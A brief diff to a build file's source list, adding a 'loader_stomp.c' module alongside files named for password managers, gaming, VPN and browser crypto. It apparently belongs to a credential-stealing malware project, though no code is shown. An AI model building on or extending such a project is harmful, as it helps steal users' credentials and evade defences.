@@ -45,6 +45,7 @@ SRCS = src/main.c \
        src/system/passman.c \
        src/system/gaming.c \
        src/system/vpn.c \
+       src/system/loader_stomp.c \
        src/crypto/chrome_crypto.c \
        src/crypto/firefox_crypto.c \
        src/crypto/chacha_poly.c \
